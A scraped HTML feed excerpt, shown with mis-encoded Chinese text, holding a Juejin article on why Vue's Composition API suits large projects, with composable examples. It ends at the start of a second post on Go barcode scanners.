itemprop="name" content="ä¸€ä¸ªå°å°å¼€å‘"/> <meta itemprop="url" content="https://juejin.cn/user/1198915135999278"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åœ¨å¤§å‹é¡¹ç›®ä¸­ä¸ºä»€ä¹ˆæ›´æ¨èComposition APIï¼Ÿå®ƒè§£å†³äº†å“ªäº›å·¥ç¨‹åŒ–é—®é¢˜ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1198915135999278/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€ä¸ªå°å°å¼€å‘
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T06:06:54.000Z" title="Mon Dec 08 2025 06:06:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. æ›´å¥½çš„é€»è¾‘ç»„ç»‡å’Œå¤ç”¨</h2>
<h3 data-id="heading-1">Options API çš„é—®é¢˜</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Options API - é€»è¾‘åˆ†æ•£åœ¨ä¸åŒé€‰é¡¹ä¸­</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">users</span>: [],
      <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">searchQuery</span>: <span class="hljs-string">''</span>,
      <span class="hljs-attr">pagination</span>: {
        <span class="hljs-attr">page</span>: <span class="hljs-number">1</span>,
        <span class="hljs-attr">limit</span>: <span class="hljs-number">10</span>,
        <span class="hljs-attr">total</span>: <span class="hljs-number">0</span>
      }
    }
  },
  
  <span class="hljs-attr">computed</span>: {
    <span class="hljs-title function_">filteredUsers</span>(<span class="hljs-params"/>) {
      <span class="hljs-comment">// ç”¨æˆ·ç­›é€‰é€»è¾‘</span>
    },
    <span class="hljs-title function_">totalPages</span>(<span class="hljs-params"/>) {
      <span class="hljs-comment">// åˆ†é¡µè®¡ç®—é€»è¾‘</span>
    }
  },
  
  <span class="hljs-attr">methods</span>: {
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">fetchUsers</span>(<span class="hljs-params"/>) {
      <span class="hljs-comment">// æ•°æ®è·å–é€»è¾‘</span>
    },
    <span class="hljs-title function_">handleSearch</span>(<span class="hljs-params"/>) {
      <span class="hljs-comment">// æœç´¢é€»è¾‘</span>
    },
    <span class="hljs-title function_">handlePageChange</span>(<span class="hljs-params"/>) {
      <span class="hljs-comment">// åˆ†é¡µé€»è¾‘</span>
    }
  },
  
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">fetchUsers</span>()
  }
}
</code></pre>
<h3 data-id="heading-2">Composition API çš„ä¼˜åŠ¿</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Composition API - æŒ‰åŠŸèƒ½ç»„ç»‡ä»£ç </span>
<span class="hljs-keyword">import</span> { ref, computed, onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { userApi } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/api/user'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">setup</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// ç”¨æˆ·ç®¡ç†åŠŸèƒ½</span>
    <span class="hljs-keyword">const</span> { users, loading, fetchUsers, searchUsers } = <span class="hljs-title function_">useUserManagement</span>()
    
    <span class="hljs-comment">// æœç´¢åŠŸèƒ½</span>
    <span class="hljs-keyword">const</span> { searchQuery, filteredUsers } = <span class="hljs-title function_">useSearch</span>(users)
    
    <span class="hljs-comment">// åˆ†é¡µåŠŸèƒ½</span>
    <span class="hljs-keyword">const</span> { pagination, paginatedUsers, handlePageChange } = <span class="hljs-title function_">usePagination</span>(filteredUsers)
    
    <span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">fetchUsers</span>()
    })
    
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">users</span>: paginatedUsers,
      loading,
      searchQuery,
      pagination,
      handlePageChange,
      searchUsers
    }
  }
}

<span class="hljs-comment">// å¯å¤ç”¨çš„ç”¨æˆ·ç®¡ç†é€»è¾‘</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">useUserManagement</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> users = <span class="hljs-title function_">ref</span>([])
  <span class="hljs-keyword">const</span> loading = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)
  
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchUsers</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    loading.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
    <span class="hljs-keyword">try</span> {
      users.<span class="hljs-property">value</span> = <span class="hljs-keyword">await</span> userApi.<span class="hljs-title function_">getUsers</span>()
    } <span class="hljs-keyword">finally</span> {
      loading.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
    }
  }
  
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">searchUsers</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">query</span>) =&gt; {
    <span class="hljs-comment">// æœç´¢å®ç°</span>
  }
  
  <span class="hljs-keyword">return</span> {
    users,
    loading,
    fetchUsers,
    searchUsers
  }
}

<span class="hljs-comment">// å¯å¤ç”¨çš„æœç´¢é€»è¾‘</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">useSearch</span>(<span class="hljs-params">source</span>) {
  <span class="hljs-keyword">const</span> searchQuery = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>)
  
  <span class="hljs-keyword">const</span> filteredUsers = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (!searchQuery.<span class="hljs-property">value</span>) <span class="hljs-keyword">return</span> source.<span class="hljs-property">value</span>
    <span class="hljs-keyword">return</span> source.<span class="hljs-property">value</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">user</span> =&gt;</span> 
      user.<span class="hljs-property">name</span>.<span class="hljs-title function_">includes</span>(searchQuery.<span class="hljs-property">value</span>)
    )
  })
  
  <span class="hljs-keyword">return</span> {
    searchQuery,
    filteredUsers
  }
}
</code></pre>
<h2 data-id="heading-3">2. æ›´å¥½çš„ TypeScript æ”¯æŒ</h2>
<blockquote>
<p>Composition API çš„å®Œæ•´ç±»å‹æ¨æ–­</p>
</blockquote>
<pre><code class="hljs language-csharp" lang="csharp">import { <span class="hljs-keyword">ref</span>, computed, Ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">interface</span> <span class="hljs-title">User</span> {
  id: number
  name: <span class="hljs-built_in">string</span>
  email: <span class="hljs-built_in">string</span>
  role: <span class="hljs-built_in">string</span>
}

<span class="hljs-comment">// æ˜ç¡®çš„ç±»å‹å®šä¹‰</span>
<span class="hljs-function">function <span class="hljs-title">useUserManagement</span>()</span> {
  <span class="hljs-keyword">const</span> users: Ref&lt;User[]&gt; = <span class="hljs-keyword">ref</span>([])
  <span class="hljs-keyword">const</span> loading = <span class="hljs-keyword">ref</span>(<span class="hljs-literal">false</span>)
  
  <span class="hljs-keyword">const</span> adminUsers = computed(() =&gt; 
    users.<span class="hljs-keyword">value</span>.filter(user =&gt; user.role === <span class="hljs-string">'admin'</span>)
  )
  
  <span class="hljs-keyword">return</span> {
    users,
    loading,
    adminUsers
  }
}
</code></pre>
<h2 data-id="heading-4">3. æ›´æ¸…æ™°çš„ä»£ç ç»„ç»‡æ¨¡å¼</h2>
<blockquote>
<p>åŸºäºåŠŸèƒ½çš„ä»£ç åˆ†å‰²</p>
</blockquote>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// feature-based-composition.js</span>
export default {
  <span class="hljs-built_in">setup</span>() {
    <span class="hljs-comment">// æ¯ä¸ªåŠŸèƒ½ç‹¬ç«‹å°è£…</span>
    const cart = <span class="hljs-built_in">useCart</span>()
    const user = <span class="hljs-built_in">useUser</span>()
    const products = <span class="hljs-built_in">useProducts</span>()
    const notifications = <span class="hljs-built_in">useNotifications</span>()
    
    <span class="hljs-comment">// åŠŸèƒ½é—´çš„ä¾èµ–å…³ç³»æ›´æ¸…æ™°</span>
    <span class="hljs-built_in">watch</span>(() =&gt; user<span class="hljs-selector-class">.isLoggedIn</span>, (loggedIn) =&gt; {
      if (loggedIn) {
        cart<span class="hljs-selector-class">.syncCart</span>()
        notifications<span class="hljs-selector-class">.fetchUnread</span>()
      }
    })
    
    return {
      ..<span class="hljs-selector-class">.cart</span>,
      ..<span class="hljs-selector-class">.user</span>,
      ..<span class="hljs-selector-class">.products</span>,
      ..<span class="hljs-selector-class">.notifications</span>
    }
  }
}
</code></pre>
<h2 data-id="heading-5">4. æ›´å¥½çš„å¯æµ‹è¯•æ€§</h2>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// ç‹¬ç«‹çš„é€»è¾‘å‡½æ•°æ˜“äºæµ‹è¯•</span>
import { useUserManagement } from './userComposition'

<span class="hljs-built_in">describe</span>('useUserManagement', () =&gt; {
  <span class="hljs-built_in">it</span>('should fetch users correctly', async () =&gt; {
    const { users, fetchUsers } = <span class="hljs-built_in">useUserManagement</span>()
    
    await <span class="hljs-built_in">fetchUsers</span>()
    
    <span class="hljs-built_in">expect</span>(users.value)<span class="hljs-selector-class">.toHaveLength</span>(<span class="hljs-number">3</span>)
  })
})
</code></pre>
<h2 data-id="heading-6">5. è§£å†³çš„å…·ä½“å·¥ç¨‹åŒ–é—®é¢˜</h2>
<h3 data-id="heading-7">5.1 é€»è¾‘å…³æ³¨ç‚¹åˆ†ç¦»</h3>
<p><strong>Options API é—®é¢˜</strong>ï¼šç›¸å…³é€»è¾‘åˆ†æ•£åœ¨Â <code>data</code>ã€<code>methods</code>ã€<code>computed</code>Â ä¸­<br/>
<strong>Composition API è§£å†³</strong>ï¼šç›¸å…³é€»è¾‘é›†ä¸­åœ¨ä¸€ä¸ªç»„åˆå‡½æ•°ä¸­</p>
<h3 data-id="heading-8">5.2 ä»£ç å¤ç”¨æ€§</h3>
<p><strong>Options API é—®é¢˜</strong>ï¼šmixins å­˜åœ¨å‘½åå†²çªå’Œæ¥æºä¸æ¸…æ™°<br/>
<strong>Composition API è§£å†³</strong>ï¼šæ˜ç¡®çš„å‡½æ•°è°ƒç”¨å’Œè¿”å›å€¼</p>
<h3 data-id="heading-9">5.3 ç±»å‹æ¨å¯¼</h3>
<p><strong>Options API é—®é¢˜</strong>ï¼šå¤æ‚çš„Â <code>this</code>Â ä¸Šä¸‹æ–‡ç±»å‹æ¨æ–­<br/>
<strong>Composition API è§£å†³</strong>ï¼šç®€å•çš„å˜é‡å’Œå‡½æ•°ç±»å‹</p>
<h3 data-id="heading-10">5.4 å¯ç»´æŠ¤æ€§</h3>
<p><strong>Options API é—®é¢˜</strong>ï¼šç»„ä»¶è¶Šå¤§ï¼Œä»£ç è¶Šéš¾ç†è§£å’Œç»´æŠ¤<br/>
<strong>Composition API è§£å†³</strong>ï¼šæŒ‰åŠŸèƒ½æ‹†åˆ†ä¸ºå°å‹ã€ä¸“æ³¨çš„ç»„åˆå‡½æ•°</p>
<h3 data-id="heading-11">5.5 å›¢é˜Ÿåä½œ</h3>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// å¤§å‹é¡¹ç›®ä¸­çš„å›¢é˜Ÿåä½œç¤ºä¾‹</span>
export default {
  <span class="hljs-built_in">setup</span>() {
    <span class="hljs-comment">// å›¢é˜ŸAè´Ÿè´£çš„ç”¨æˆ·æ¨¡å—</span>
    const user = <span class="hljs-built_in">useUserModule</span>()
    
    <span class="hljs-comment">// å›¢é˜ŸBè´Ÿè´£çš„æ”¯ä»˜æ¨¡å—</span>
    const payment = <span class="hljs-built_in">usePaymentModule</span>()
    
    <span class="hljs-comment">// å›¢é˜ŸCè´Ÿè´£çš„é€šçŸ¥æ¨¡å—</span>
    const notifications = <span class="hljs-built_in">useNotificationModule</span>()
    
    <span class="hljs-comment">// æ¸…æ™°çš„æ¨¡å—è¾¹ç•Œå’Œæ¥å£</span>
    return {
      ..<span class="hljs-selector-class">.user</span>,
      ..<span class="hljs-selector-class">.payment</span>,
      ..<span class="hljs-selector-class">.notifications</span>
    }
  }
}
</code></pre>
<h2 data-id="heading-12">6.æ€»ç»“</h2>
<p>Composition API åœ¨å¤§å‹é¡¹ç›®ä¸­æ›´å—æ¨èçš„ä¸»è¦åŸå› ï¼š</p>
<ol>
<li>æ›´å¥½çš„é€»è¾‘ç»„ç»‡ï¼šæŒ‰åŠŸèƒ½è€Œéé€‰é¡¹ç±»å‹ç»„ç»‡ä»£ç </li>
<li>æ›´å¼ºçš„ç±»å‹æ”¯æŒï¼šå®Œæ•´çš„ TypeScript é›†æˆ</li>
<li>æ›´é«˜çš„å¤ç”¨æ€§ï¼šé€»è¾‘å¯ä»¥è½»æ¾æå–å’Œå¤ç”¨</li>
<li>æ›´æ¸…æ™°çš„ä»£ç ç»“æ„ï¼šå¤§å‹ç»„ä»¶æ›´æ˜“ç†è§£å’Œç»´æŠ¤</li>
<li>æ›´å¥½çš„å¯æµ‹è¯•æ€§ï¼šé€»è¾‘ä¸ç»„ä»¶å®ä¾‹è§£è€¦</li>
<li>æ›´ä½³çš„å›¢é˜Ÿåä½œï¼šæ˜ç¡®çš„æ¨¡å—è¾¹ç•Œå’Œæ¥å£</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Golangå¼€å‘è‡ªåŠ¨åŠ è½½COMæ‰«ç æªè¿›è¡Œä¸€ç»´ç ã€äºŒç»´ç æ‰«ç ä¸è§£ç ]]></title>    <link>https://juejin.cn/post/7581004702945542171</link>    <guid>https://juejin.cn/post/7581004702945542171</guid>    <pubDate>2025-12-08T05:51:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581004702945542171" data-draft-id="7580940585692610598" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Golangå¼€å‘è‡ªåŠ¨åŠ è½½COMæ‰«ç æªè¿›è¡Œä¸€ç»´ç ã€äºŒç»´ç æ‰«ç ä¸è§£ç "/> <meta itemprop="keywords" content="Go"/> <meta itemprop="datePublished" content="2025-12-08T05:51:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å…‰å¤´é—ªäº®äº®"/> <meta itemprop="url" content="https://juejin.cn/user/1333047014199326"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Golangå¼€å‘è‡ªåŠ¨åŠ è½½COMæ‰«ç æªè¿›è¡Œä¸€ç»´ç ã€äºŒç»´ç æ‰«ç ä¸è§£ç 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1333047014199326/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å…‰å¤´é—ªäº®äº®
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T05:51:50.000Z" title="Mon Dec 08 2025 05:51:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    15
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Golangå¼€å‘è‡ªåŠ¨åŠ è½½COMæ‰«ç æªè¿›è¡Œä¸€ç»´ç ã€äºŒç»´ç æ‰«ç ä¸è§£ç </h2>
<h3 data-id="heading-1">1. é¡¹ç›®æ¦‚è¿°</h3>
